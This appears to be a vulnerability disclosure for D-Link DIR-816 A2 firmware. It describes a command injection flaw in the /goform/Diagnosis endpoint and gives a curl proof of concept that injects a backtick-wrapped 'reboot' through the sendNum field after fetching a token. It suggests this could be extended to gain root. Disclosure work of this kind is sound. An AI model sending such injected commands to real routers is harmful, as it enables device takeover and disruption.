# D-link DIR-816 A2_v1.10CNB04.img Command injection vulnerability

## Firmware information

- Manufacturer's address：https://www.dlink.com/

- Firmware download address ： http://tsd.dlink.com.tw/GPL.asp

## Affected version

![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/dir816/img/vuln2.png)

The picture above shows the latest firmware for this version

## Vulnerability details

![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/Dir816/Diagnosis/img/vuln1.png)

Vulnerability occurs in /goform/Diagnosis，After the if condition is met, setnum will be spliced into v10 by snprintf, and finally system will be executed, resulting in a command injection vulnerability

## Poc

The first thing you need to do is to get the tokenid
```
curl http://192.168.0.1/dir_login.asp | grep tokenid
```

Then run the following poc

```
curl -i -X POST http://192.168.0.1/goform/Diagnosis -d tokenid=xxxx -d 'pingAddr=192.168.0.1' -d 'sendNum=`reboot`'
```

Then you can see that the router restarts, and finally we can write an exp to get root
